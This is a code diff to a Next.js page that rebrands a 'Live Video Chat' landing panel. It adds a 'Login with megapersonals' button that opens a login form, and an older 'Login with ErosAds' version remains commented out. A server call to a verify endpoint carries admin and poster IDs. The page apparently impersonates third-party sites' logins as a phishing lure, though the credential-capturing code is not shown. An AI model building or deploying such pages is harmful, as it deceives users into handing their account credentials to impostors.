@@ -3,7 +3,6 @@ import Login from "../../../components/Login";
 import Webcam from "react-webcam";
 import { API_URL, site } from "../../../config";
 import Image from "next/image";
-import LoginForm from "../../../components/LoginForm";
 
 const IconPhone = () => {
   return (
@@ -106,22 +105,62 @@ export default function Home() {
         ) : (
           <>
             {!showForm ? (
-            <div className="bg-white flex flex-col justify-center shadow-xl items-center md:w-[420px] pb-[100px] rounded-lg">
-            <div className="relative">
-           <div className=" w-[320px] h-[250px] pb-[200px]">
-             <Image
-               src="/images/du_icon.svg"
-               alt="avatar"
-               fill
-               className="object-cover "
-             />
-           </div>
-           
-         </div>
-         <button className="text-white px-10 py-2 outline-none border rounded-md mt-7 border-blue-500 bg-blue-500"  onClick={() => setShowForm(true)}>Get started with $0.10 </button>
-           </div>
+              <div className="bg-white md:w-[420px] shadow-around rounded-lg">
+                <div className=" flex flex-col items-center py-4">
+                  <div className="px-8 md:px-12">
+                    <h3 className="text-[32px] font-bold text-[#2b044d] text-center">
+                      Live Video Chat
+                    </h3>
+
+                    {/* <p className="mt-[15px] text-lg leading-tight font-medium ">
+                      Login with erosads and enjoy with{" "}
+                      <span className="text-[#2b044d] font-bold">
+                        Private Live Video Chat
+                      </span>{" "}
+                      your dating partner.
+                    </p> */}
+                    <p className="mt-[15px] text-lg leading-tight font-medium ">
+                      Login with megapersonals and enjoy with{" "}
+                      <span className="text-[#2b044d] font-bold">
+                        Private Live Video Chat
+                      </span>{" "}
+                      your dating partner.
+                    </p>
+                  </div>
+
+                  <div className="mt-[35px] mb-10 px-4 md:px-12 flex w-full font-serif">
+                    {/* <button
+                      className="bg-[#990033] text-white text-lg lg:text-[22px] flex items-center gap-10 lg:gap-5 px-5 py-[6px] rounded-md w-full"
+                      onClick={() => setShowForm(true)}
+                    >
+                      <div className="relative rounded-md w-8 h-8">
+                        <Image
+                          src="/favicon.ico"
+                          fill
+                          className="object-cover"
+                        />
+                      </div>
+                      <p className="">Login with ErosAds</p>
+                    </button> */}
+                    <button
+                      className="bg-[#58C2FC] text-white text-lg  flex items-center gap-10 lg:gap-5 px-5 py-[6px] rounded-md w-full"
+                      onClick={() => setShowForm(true)}
+                    >
+                      <div className="relative w-10 h-10 rounded-md overflow-hidden">
+                        <Image
+                          src="/images/logo-potrait.jpg"
+                          alt="potrait"
+                          fill
+                          className="object-cover"
+                        />
+                      </div>
+                      <p className="">Login with megapersonals</p>
+                    </button>
+                  </div>
+                </div>
+              </div>
             ) : (
-              <LoginForm />
+              <Login />
             )}
           </>
         )}
@@ -197,7 +236,7 @@ export async function getServerSideProps({
   const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";
 
   const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;
-
+  
   const res = await fetch(url);
   const data = await res.json();
 
